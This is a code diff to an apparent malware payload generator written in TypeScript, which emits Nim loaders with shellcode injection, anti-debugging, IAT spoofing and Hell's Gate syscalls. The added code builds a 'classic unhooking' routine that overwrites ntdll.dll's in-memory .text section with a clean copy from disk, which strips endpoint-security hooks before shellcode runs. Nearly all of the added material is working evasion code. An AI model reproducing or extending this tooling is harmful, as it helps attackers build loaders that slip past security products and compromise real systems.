@@ -8,6 +8,10 @@ export class PayloadService {
             imports.push('puppy');
         }
 
+        if (config.syscall_evasion === 'unhooking_classique') {
+            imports.push('ptr_math', 'strformat');
+        }
+
         const directives = [];
         // ASM needed for PEB check, Hell's Gate, or any inline ASM
         if (config.anti_debug.length > 0 || config.syscall_evasion === 'hells_gate') {
@@ -23,6 +27,7 @@ export class PayloadService {
         const utilsBlock = this.generateUtilsBlock(config);
         const iatSpoofing = config.iat_spoofing.length > 0 ? this.generateIATSpoofing(config.iat_spoofing) : "";
         const hellsGateInfra = config.syscall_evasion === 'hells_gate' ? this.generateHellsGateInfra() : "";
+        const unhookingLogic = config.syscall_evasion === 'unhooking_classique' ? this.generateUnhookingClassique() : "";
         const evasionProcs = this.generateEvasionProcs(config);
         const injectionProc = this.generateInjectionProc(config);
         const shellcodeBlock = this.generateShellcodeBlock(config);
@@ -70,6 +75,7 @@ ${utilsBlock}
 ${iatSpoofing}
 
 ${hellsGateInfra}
+${unhookingLogic}
 
 ${evasionProcs}
 
@@ -700,6 +706,11 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
     private generateMainLogic(config: PayloadRequest): string {
         let code = "";
 
+        // 0. Classic Unhooking - Restore ntdll.dll
+        if (config.syscall_evasion === 'unhooking_classique') {
+            code += 'if not ntdllunhook(): quit(1)\n';
+        }
+
         // 0. IAT Spoofing - populate IAT with benign functions
         if (config.iat_spoofing.length > 0) {
             code += "populateIAT()\n";
@@ -783,5 +794,71 @@ var shellcode: seq[byte] = toByteSeq(shellcodeStr)
         }
 
         return ""; // Should be caught by validation
+    }
+
+    private generateUnhookingClassique(): string {
+        return `
+# ============================================================================
+# Classic Unhooking Logic
+# ============================================================================
+
+proc toString(bytes: openarray[byte]): string =
+    result = newString(bytes.len)
+    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+proc ntdllunhook(): bool =
+    let low: uint16 = 0
+    var
+        processH = GetCurrentProcess()
+        mi : MODULEINFO
+        ntdllModule = GetModuleHandleA("ntdll.dll")
+        ntdllBase : LPVOID
+        ntdllFile : FileHandle
+        ntdllMapping : HANDLE
+        ntdllMappingAddress : LPVOID
+        hookedDosHeader : PIMAGE_DOS_HEADER
+        hookedNtHeader : PIMAGE_NT_HEADERS
+        hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+    GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+    ntdllBase = mi.lpBaseOfDll
+    ntdllFile = getOsFileHandle(open("C:\\\\windows\\\\system32\\\\ntdll.dll", fmRead))
+    ntdllMapping = CreateFileMapping(ntdllFile, NULL, 0x1000002, 0, 0, NULL) # SEC_IMAGE (0x1000000) | PAGE_READONLY (0x02)
+    
+    if ntdllMapping == 0:
+        # echo fmt"Could not create file mapping object ({GetLastError()})."
+        return false
+    
+    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+    if ntdllMappingAddress.isNil:
+        # echo fmt"Could not map view of file ({GetLastError()})."
+        return false
+
+    hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+    hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+
+    for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+        hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+        
+        if ".text" in toString(hookedSectionHeader.Name):
+            var oldProtection : DWORD = 0
+            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0: # 0x40 = PAGE_EXECUTE_READWRITE
+                # echo fmt"Failed calling VirtualProtect ({GetLastError()})."
+                return false
+            
+            copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
+            
+            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
+                # echo fmt"Failed resetting memory back to its original protections ({GetLastError()})."
+                return false
+
+    CloseHandle(processH)
+    CloseHandle(ntdllFile)
+    CloseHandle(ntdllMapping)
+    # FreeLibrary(ntdllModule) # We don't want to free ntdll
+    return true
+
+# ============================================================================
+`;
     }
 }
